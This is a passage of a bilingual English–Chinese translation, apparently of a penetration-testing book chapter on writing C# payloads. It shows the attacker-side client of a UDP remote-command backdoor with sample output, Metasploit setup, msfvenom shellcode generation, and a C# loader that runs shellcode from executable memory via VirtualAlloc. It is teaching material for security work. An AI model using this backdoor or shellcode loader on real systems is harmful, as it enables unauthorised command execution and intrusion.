  type: TYPE_NORMAL
  zh: IPEndPoint addrEP = new ➌IPEndPoint(addr, lport); 列表 4-14：创建 UDP 套接字和端点以进行通信
- en: To begin, we instantiate a new Socket class ➊ within the context of a using
    block. The enumeration values passed to Socket tell the socket that we’ll be using
    IPv4 addressing, datagrams, and UDP to communicate via broadcasts. We instantiate
    a new IPAddress with IPAddress.Parse() ➋ to convert the first argument passed
    to the code to an IPAddress class. We then pass the IPAddress object and the port
    on which the target’s UDP listener will be listening to the IPEndPoint constructor
    in order to instantiate a new IPEndPoint class ➌.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们在 using 块的上下文中实例化一个新的 Socket 类 ➊。传递给 Socket 的枚举值告诉套接字，我们将使用 IPv4 地址、数据报和
    UDP 通过广播进行通信。我们使用 IPAddress.Parse() ➋ 创建一个新的 IPAddress 实例，将传递给代码的第一个参数转换为 IPAddress
    类。然后，我们将 IPAddress 对象和目标 UDP 监听器监听的端口传递给 IPEndPoint 构造函数，以实例化一个新的 IPEndPoint 类
    ➌。
- en: Communicating with the Target
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 与目标通信
- en: '[Listing 4-15](#filepos386609) shows how we can now send data to and receive
    data from the target.'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: '[清单 4-15](#filepos386609) 显示了我们如何将数据发送到目标并从目标接收数据。'
- en: Console.WriteLine("Enter command to send, or a blank line to quit");
  id: totrans-263
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("Enter command to send, or a blank line to quit");
- en: while (true)
  id: totrans-264
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: while (true)
- en: '{'
  id: totrans-265
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string command = ➊Console.ReadLine();
  id: totrans-266
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string command = ➊Console.ReadLine();
- en: byte[] buff = Encoding.ASCII.GetBytes(command);
  id: totrans-267
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] buff = Encoding.ASCII.GetBytes(command);
- en: ''
  id: totrans-268
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: try
  id: totrans-269
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: try
- en: '{'
  id: totrans-270
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: sock.➋SendTo(buff, addrEP);
  id: totrans-271
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.➋SendTo(buff, addrEP);
- en: ''
  id: totrans-272
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrEmpty(command))
  id: totrans-273
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrEmpty(command))
- en: '{'
  id: totrans-274
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: sock.Close();
  id: totrans-275
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.Close();
- en: listener.Close();
  id: totrans-276
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: listener.Close();
- en: return;
  id: totrans-277
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return;
- en: '}'
  id: totrans-278
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-279
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrWhiteSpace(command))
  id: totrans-280
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrWhiteSpace(command))
- en: continue;
  id: totrans-281
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: continue;
- en: ''
  id: totrans-282
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: bytes = listener.➌Receive(ref localEP);
  id: totrans-283
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bytes = listener.➌Receive(ref localEP);
- en: output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
  id: totrans-284
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
- en: Console.WriteLine(output);
  id: totrans-285
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(output);
- en: '}'
  id: totrans-286
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch (Exception ex)
  id: totrans-287
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: catch (Exception ex)
- en: '{'
  id: totrans-288
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Console.WriteLine("Exception{0}", ex.Message);
  id: totrans-289
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("Exception{0}", ex.Message);
- en: '}'
  id: totrans-290
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-291
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-292
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-293
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-294
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-15: Main logic to send and receive data to and from the target’s
    UDP listener'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: '清单 4-15: 发送和接收数据到目标 UDP 监听器的主逻辑'
- en: After printing some friendly help text on how to use this script, we begin sending
    commands to the target in a while loop. First, Console.ReadLine() ➊ reads in a
    line of data from standard input, which will become the command to send to the
    target’s machine. Then, Encoding.ASCII.GetBytes() converts this string into a
    byte array so that we can send it over the network.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 在打印了一些友好的帮助文本，说明如何使用此脚本后，我们开始在一个 while 循环中向目标发送命令。首先，Console.ReadLine() ➊ 从标准输入中读取一行数据，这将成为发送到目标机器的命令。然后，Encoding.ASCII.GetBytes()
    将该字符串转换为字节数组，以便我们可以通过网络发送它。
- en: Next, within a try/catch block, we attempt to send the byte array using SendTo()
    ➋, passing in the byte array and the IP endpoint to send the data to. After sending
    the command string, we return out of the while loop if the string read from standard
    input was empty because we built the same logic into the target code. If the string
    is not empty, but is only whitespace, we return to the beginning of the while
    loop. Then we call Receive() ➌ on the UDP listener to block execution until the
    command output is received from the target, at which point Encoding.ASCII.GetString()
    converts the bytes received to a string that is then written to the attacker’s
    console. If an error occurs, we print an exception message to the screen.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，在一个 try/catch 块中，我们尝试使用 SendTo() ➋ 发送字节数组，传入字节数组和要发送数据的 IP 端点。在发送命令字符串后，如果从标准输入读取的字符串为空，我们将跳出
    while 循环，因为我们在目标代码中构建了相同的逻辑。如果字符串不是空的，但只是空白，我们会返回到 while 循环的开头。然后，我们在 UDP 监听器上调用
    Receive() ➌，以阻塞执行，直到从目标接收到命令输出，这时使用 Encoding.ASCII.GetString() 将接收到的字节转换为字符串，并写入攻击者的控制台。如果发生错误，我们将在屏幕上打印异常消息。
- en: As shown in [Listing 4-16](#filepos388999), after starting the payload on a
    remote machine, passing 4444 as the only argument to the payload, and starting
    the receiver on the attacker’s machine, we should be able to execute commands
    and receive output from the target.
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 如[清单 4-16](#filepos388999)所示，在远程机器上启动有效载荷，传递 4444 作为唯一参数给有效载荷，并在攻击者的机器上启动接收器后，我们应该能够执行命令并从目标接收输出。
- en: $ /tmp/attacker.exe 192.168.1.31 4444
  id: totrans-299
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ /tmp/attacker.exe 192.168.1.31 4444
- en: Enter command to send, or a blank line to quit
  id: totrans-300
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 输入命令以发送，或者输入空行退出
- en: whoami
  id: totrans-301
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: whoami
- en: bperry
  id: totrans-302
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bperry
- en: pwd
  id: totrans-303
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: pwd
- en: /tmp
  id: totrans-304
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: /tmp
- en: uname
  id: totrans-305
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: uname
- en: 'Linux Listing 4-16: Communicating with the target machine over UDP in order
    to run arbitrary commands'
  id: totrans-306
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Linux 清单 4-16: 通过 UDP 与目标机器通信以执行任意命令'
- en: Running x86 and x86-64 Metasploit Payloads from C#
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 从 C# 运行 x86 和 x86-64 Metasploit Payloads
- en: The Metasploit Framework exploitation toolset, begun by HD Moore and now developed
    by Rapid7, has become the de facto penetration testing and exploit development
    framework for security professionals. Because it’s written in Ruby, Metasploit
    is cross-platform and will run on Linux, Windows, OS X, and a slew of other operating
    systems. As of this writing, there are more than 1,300 free Metasploit exploits
    written in the Ruby programming language.
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit Framework 漏洞利用工具集由 HD Moore 开始开发，现在由 Rapid7 维护，已成为安全专业人士的事实上的渗透测试和漏洞开发框架。由于它是用
    Ruby 编写的，Metasploit 是跨平台的，可以在 Linux、Windows、OS X 和其他许多操作系统上运行。截止目前，已有超过 1,300
    个用 Ruby 编程语言编写的免费 Metasploit 漏洞利用。
- en: In addition to its collection of exploits, Metasploit contains many libraries
    designed to make exploit development quick and generally painless. For example,
    as you’ll soon see, you can use Metasploit to help create a cross-platform .NET
    assembly to detect your operating system type and architecture and to run shellcode
    against it.
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 除了其包含的漏洞利用集合外，Metasploit 还包含许多旨在使漏洞开发快速且通常无痛的库。例如，正如你很快会看到的，你可以使用 Metasploit
    来帮助创建一个跨平台的 .NET 程序集，以检测你的操作系统类型和架构，并针对其运行 shellcode。
- en: Setting Up Metasploit
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 设置 Metasploit
- en: As of this writing, Rapid7 develops Metasploit on GitHub ([https://github.com/rapid7/metasploit-framework/](https://github.com/rapid7/metasploit-framework/)).
    On Ubuntu, use git to clone the master Metasploit repository to your system, as
    shown in [Listing 4-17](#filepos390897).
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 截至本文撰写时，Rapid7 在 GitHub 上开发 Metasploit ([https://github.com/rapid7/metasploit-framework/](https://github.com/rapid7/metasploit-framework/))。在
    Ubuntu 上，使用 git 克隆主 Metasploit 仓库到系统中，如[清单 4-17](#filepos390897)所示。
- en: $ sudo apt-get install git
  id: totrans-312
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ sudo apt-get install git
- en: '$ git clone https://github.com/rapid7/metasploit-framework.git  Listing 4-17:
    Installing git and cloning the Metasploit Framework'
  id: totrans-313
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ git clone https://github.com/rapid7/metasploit-framework.git  清单 4-17：安装 git
    并克隆 Metasploit Framework
- en: NOTE
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: I recommend using Ubuntu when developing the next payload in this chapter. Of
    course, testing will also need to be done on Windows to ensure your OS detection
    and payloads work across both platforms.
  id: totrans-315
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 我建议在本章开发下一个载荷时使用 Ubuntu。当然，也需要在 Windows 上进行测试，以确保你的操作系统检测和载荷在这两个平台上都能正常工作。
- en: Installing Ruby
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 安装 Ruby
- en: The Metasploit Framework requires Ruby. If, after reading the Metasploit install
    instructions online, you find that you need a different version of Ruby installed
    on your Linux system, use RVM, the Ruby Version Manager ([http://rvm.io/](http://rvm.io/))
    to install it alongside any existing version of Ruby. Install the RVM maintainer’s
    GNU Privacy Guard (GPG) key and then install RVM on Ubuntu, as shown in [Listing
    4-18](#filepos392317).
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit Framework 需要 Ruby。如果在阅读了 Metasploit 安装说明后，发现你需要在 Linux 系统上安装不同版本的
    Ruby，可以使用 Ruby 版本管理器（RVM，Ruby Version Manager）([http://rvm.io/](http://rvm.io/))
    来安装它，并与现有的 Ruby 版本一起使用。首先安装 RVM 维护者的 GNU 隐私保护（GPG）密钥，然后按照[清单 4-18](#filepos392317)中的方法在
    Ubuntu 上安装 RVM。
- en: $ curl -sSL https://rvm.io/mpapis.asc | gpg --import -
  id: totrans-318
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ curl -sSL https://rvm.io/mpapis.asc | gpg --import -
- en: '$ curl -sSL https://get.rvm.io | bash -s stable  Listing 4-18: Installing RVM'
  id: totrans-319
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ curl -sSL https://get.rvm.io | bash -s stable  清单 4-18：安装 RVM
- en: Once RVM is installed, determine which version of Ruby the Metasploit Framework
    requires by viewing the .ruby-version file at the root of the Metasploit Framework,
    as shown in [Listing 4-19](#filepos392919).
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 安装 RVM 后，通过查看 Metasploit Framework 根目录下的 .ruby-version 文件，确定 Metasploit Framework
    需要的 Ruby 版本，如[清单 4-19](#filepos392919)所示。
- en: $ cd metasploit-framework/
  id: totrans-321
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ cd metasploit-framework/
- en: $ cat .ruby-version
  id: totrans-322
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ cat .ruby-version
- en: 2.1.5
  id: totrans-323
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 2.1.5
- en: 'Listing 4-19: Printing the contents of the .ruby-version file at the root of
    the Metasploit Framework'
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 4-19：打印 Metasploit Framework 根目录下的 .ruby-version 文件内容
- en: Now run the rvm command to compile and install the correct version of Ruby,
    as shown in [Listing 4-20](#filepos393589). This may take several minutes, depending
    on your internet and CPU speed.
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 现在运行 rvm 命令来编译并安装正确版本的 Ruby，如[清单 4-20](#filepos393589)所示。这可能需要几分钟，具体取决于你的互联网连接和
    CPU 速度。
- en: $ rvm install 2.x
  id: totrans-326
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ rvm install 2.x
- en: 'Listing 4-20: Installing the version of Ruby required by Metasploit'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 4-20：安装 Metasploit 所需的 Ruby 版本
- en: Once your Ruby install completes, set your bash environment to see it, as shown
    in [Listing 4-21](#filepos394063).
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦 Ruby 安装完成，按照[清单 4-21](#filepos394063)中的方法设置你的 bash 环境，以便能够看到它。
- en: $ rvm use 2.x
  id: totrans-329
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ rvm use 2.x
- en: 'Listing 4-21: Setting the installed version of Ruby as the default'
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 4-21：将安装的 Ruby 版本设置为默认版本
- en: Installing Metasploit Dependencies
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 安装 Metasploit 依赖项
- en: Metasploit uses the bundler gem (a Ruby package) to manage dependencies. Change
    to the current Metasploit Framework git checkout directory on your machine and
    run the commands shown in [Listing 4-22](#filepos395135) to install the development
    libraries needed to build some of the gems required by the Metasploit Framework.
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 使用 bundler gem（一个 Ruby 包）来管理依赖项。切换到你机器上的当前 Metasploit Framework git
    检出目录，并运行 [Listing 4-22](#filepos395135) 中显示的命令，以安装构建 Metasploit Framework 所需的某些
    gem 所需的开发库。
- en: $ cd metasploit-framework/
  id: totrans-333
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ cd metasploit-framework/
- en: $ sudo apt-get install libpq-dev libpcap-dev libxslt-dev
  id: totrans-334
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ sudo apt-get install libpq-dev libpcap-dev libxslt-dev
- en: $ gem install bundler
  id: totrans-335
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ gem install bundler
- en: '$ bundle install  Listing 4-22: Installing Metasploit dependencies'
  id: totrans-336
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '$ bundle install  Listing 4-22: 安装 Metasploit 依赖项'
- en: Once all dependencies have been installed, you should be able to start the Metasploit
    Framework, as shown in [Listing 4-23](#filepos395587).
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦所有依赖项安装完成，你应该能够启动 Metasploit Framework，如 [Listing 4-23](#filepos395587) 所示。
- en: $ ./msfconsole -q
  id: totrans-338
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ ./msfconsole -q
- en: 'msf > Listing 4-23: Starting Metasploit successfully'
  id: totrans-339
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'msf > Listing 4-23: 成功启动 Metasploit'
- en: With msfconsole started successfully, we can begin using the other tools in
    the framework to generate payloads.
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 成功启动 msfconsole 后，我们可以开始使用框架中的其他工具来生成负载。
- en: Generating Payloads
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 生成负载
- en: We’ll use the Metasploit tool msfvenom to generate raw assembly payloads to
    open programs on Windows or run commands on Linux. For example, [Listing 4-24](#filepos397025)
    shows how commands sent to msfvenom would generate an x86-64 (64-bit) payload
    for Windows that will pop up the calc.exe Windows calculator on the currently
    displayed desktop. (To see the msfvenom tool’s full list of options, run msfvenom
    --help from the command line.) $ ./msfvenom -p windows/x64/exec -f csharp CMD=calc.exe
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用 Metasploit 工具 msfvenom 来生成原始汇编负载，在 Windows 上打开程序或在 Linux 上运行命令。例如，[Listing
    4-24](#filepos397025) 展示了如何向 msfvenom 发送命令，生成一个 x86-64（64 位）负载，用于 Windows，弹出当前显示桌面上的
    calc.exe Windows 计算器。（要查看 msfvenom 工具的完整选项列表，请从命令行运行 msfvenom --help。） $ ./msfvenom
    -p windows/x64/exec -f csharp CMD=calc.exe
- en: No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 未选择平台，正在从负载中选择 Msf::Module::Platform::Windows
- en: 'No Arch selected, selecting Arch: x86_64 from the payload'
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 未选择架构，正在从负载中选择架构：x86_64
- en: No encoder or badchars specified, outputting raw payload
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 未指定编码器或坏字符，输出原始负载
- en: byte[] buf = new byte[276] {
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: byte[] buf = new byte[276] {
- en: 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
- en: --snip--
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: --snip--
- en: '0x63,0x2e,0x65,0x78,0x65,0x00 }; Listing 4-24: Running msfvenom to generate
    a raw Windows payload that runs calc.exe Here we pass in windows/x64/exec as the
    payload, csharp as the payload format, and the payload option CMD=calc.exe. You
    might also pass in something like linux/x86/exec with CMD=whoami to generate a
    payload that, when launched on a 32-bit Linux system, runs the command whoami.'
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: '0x63,0x2e,0x65,0x78,0x65,0x00 }; Listing 4-24: 运行 msfvenom 生成一个原始 Windows 负载，运行
    calc.exe 在这里，我们传入 windows/x64/exec 作为负载，csharp 作为负载格式，负载选项 CMD=calc.exe。你也可以传入像
    linux/x86/exec 并使用 CMD=whoami 来生成一个负载，该负载在 32 位 Linux 系统上启动时，运行 whoami 命令。'
- en: Executing Native Windows Payloads as Unmanaged Code
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 以非托管代码执行原生 Windows 负载
- en: Metasploit payloads are generated in 32- or 64-bit assembly code—called unmanaged
    code in the .NET world. When you compile C# code into a DLL or executable assembly,
    that code is referred to as managed code. The difference between the two is that
    the managed code requires a .NET or Mono virtual machine in order to run, whereas
    the unmanaged code can be run directly by the operating system.
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 负载以 32 位或 64 位汇编代码生成——在 .NET 世界中称为非托管代码。当你将 C# 代码编译成 DLL 或可执行程序集时，该代码被称为托管代码。两者的区别在于，托管代码需要
    .NET 或 Mono 虚拟机才能运行，而非托管代码可以直接由操作系统运行。
- en: To execute unmanaged assembly code within a managed environment, we’ll use .NET’s
    P/Invoke to import and run the VirtualAlloc() function from the Microsoft Windows
    kernel32.dll. This lets us allocate the readable, writable, and executable memory
    required, as shown in [Listing 4-25](#filepos398998).
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 要在托管环境中执行非托管汇编代码，我们将使用 .NET 的 P/Invoke 来导入并运行 Microsoft Windows kernel32.dll
    中的 VirtualAlloc() 函数。这使我们能够分配所需的可读、可写和可执行的内存，如 [Listing 4-25](#filepos398998)
    所示。
- en: class MainClass
  id: totrans-353
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: class MainClass
- en: '{'
  id: totrans-354
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: '[➊DllImport("kernel32")]'
  id: totrans-355
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[➊DllImport("kernel32")]'
- en: static extern IntPtr ➋VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr
    mode);
  id: totrans-356
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: static extern IntPtr ➋VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr
    mode);
- en: ''
  id: totrans-357
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '[➌UnmanagedFunctionPointer(CallingConvention.StdCall)]'
  id: totrans-358
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '[➌UnmanagedFunctionPointer(CallingConvention.StdCall)]'
- en: 'delegate void ➍WindowsRun(); Listing 4-25: Importing the  VirtualAlloc()  kernel32.dll
    function and defining a Windows-specific delegate'
  id: totrans-359
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: delegate void ➍WindowsRun(); 列表 4-25：导入 VirtualAlloc() 函数并定义一个 Windows 特定的委托
- en: At ➋, we import VirtualAlloc() from kernel32.dll. The VirtualAlloc() function
    takes four arguments of type IntPtr, which is a C# class that makes passing data
    between managed and unmanaged code much simpler. At ➊, we use the C# attribute
    DllImport (an attribute is like an annotation in Java or a decorator in Python)
    to tell the virtual machine to look for this function in the kernel32.dll library
    at runtime. (We’ll use the DllImport attribute to import functions from libc when
    executing Linux payloads.) At ➍, we declare the delegate WindowsRun(), which has
    an UnmanagedFunctionPointer attribute ➌ that tells the Mono/.NET virtual machine
    to run this delegate as an unmanaged function. By passing CallingConvention.StdCall
    to the UnmanagedFunctionPointer attribute, we tell the Mono/.NET virtual machine
    to call VirtualAlloc() using the StdCall Windows calling convention.
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ➋ 处，我们从 kernel32.dll 导入 VirtualAlloc()。VirtualAlloc() 函数需要四个类型为 IntPtr 的参数，IntPtr
    是一个 C# 类，它使得在托管代码和非托管代码之间传递数据变得更加简单。在 ➊ 处，我们使用 C# 属性 DllImport（属性类似于 Java 中的注解或
    Python 中的装饰器）来告诉虚拟机在运行时从 kernel32.dll 库中查找此函数。（当我们执行 Linux 负载时，我们将使用 DllImport
    属性从 libc 导入函数。）在 ➍ 处，我们声明了一个委托 WindowsRun()，它有一个 UnmanagedFunctionPointer 属性 ➌，该属性告诉
    Mono/.NET 虚拟机将此委托作为非托管函数运行。通过将 CallingConvention.StdCall 传递给 UnmanagedFunctionPointer
    属性，我们告诉 Mono/.NET 虚拟机使用 StdCall Windows 调用约定调用 VirtualAlloc()。
- en: First we need to write a Main() method to execute the payload according to the
    target system architecture, as shown in [Listing 4-26](#filepos401856).
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 首先我们需要编写一个 Main() 方法，以根据目标系统架构执行负载，如 [列表 4-26](#filepos401856) 所示。
- en: public static void Main(string[] args)
  id: totrans-362
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-363
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: OperatingSystem os = ➊Environment.OSVersion;
  id: totrans-364
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: OperatingSystem os = ➊Environment.OSVersion;
- en: bool x86 = ➋(IntPtr.Size == 4);
  id: totrans-365
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bool x86 = ➋(IntPtr.Size == 4);
- en: byte[] payload;
  id: totrans-366
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] payload;
- en: ''
  id: totrans-367
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (os.Platform == ➌PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
  id: totrans-368
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (os.Platform == ➌PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
- en: '{'
  id: totrans-369
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (!x86)
  id: totrans-370
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (!x86)
- en: payload = new byte[] { [... FULL x86-64 PAYLOAD HERE ...] };
  id: totrans-371
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: payload = new byte[] { [... 完整的 x86-64 负载在此 ...] };
- en: else
  id: totrans-372
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else
- en: payload = new byte[] { [... FULL x86 PAYLOAD HERE ...] };
  id: totrans-373
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: payload = new byte[] { [... 完整的 x86 负载在此 ...] };
- en: ''
  id: totrans-374
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: IntPtr ptr = ➍VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000,
    (IntPtr)0x40);
  id: totrans-375
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IntPtr ptr = ➍VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000,
    (IntPtr)0x40);
- en: ➎Marshal.Copy(payload, 0, ptr, payload.Length);
  id: totrans-376
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➎Marshal.Copy(payload, 0, ptr, payload.Length);
- en: WindowsRun r = (WindowsRun)➏Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
  id: totrans-377
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: WindowsRun r = (WindowsRun)➏Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
- en: r();
  id: totrans-378
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: r();
- en: '}'
  id: totrans-379
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-380
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-26: Small C# class wrapping two Metasploit payloads'
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 4-26：封装两个 Metasploit 负载的小型 C# 类
- en: To determine the target operating system, we capture the variable Environment.OSVersion
    ➊, which has a Platform property that identifies the current system (as used in
    the if statement). To determine the target architecture, we compare the size of
    an IntPtr to the number 4 ➋ because on a 32-bit system, a pointer is 4 bytes long,
    but on a 64-bit system, it’s 8 bytes long. We know that if the IntPtr size is
    4, we are on a 32-bit system; otherwise, we assume the system is 64-bit. We also
    declare a byte array called payload to hold our generated payload.
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定目标操作系统，我们捕获变量 Environment.OSVersion ➊，它有一个 Platform 属性，用于识别当前系统（如 if 语句中所使用）。为了确定目标架构，我们将
    IntPtr 的大小与数字 4 ➋ 进行比较，因为在 32 位系统中，指针是 4 字节长，但在 64 位系统中，它是 8 字节长。我们知道，如果 IntPtr
    大小是 4，我们就是 32 位系统；否则，我们假设系统是 64 位的。我们还声明了一个字节数组 payload 来保存我们生成的负载。
- en: Now we can set up our native assembly payload. If the current operating system
    matches a Windows PlatformID ➌ (a list of known platforms and operating system
    versions), we assign a byte array to the payload variable according to the system’s
    architecture.
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
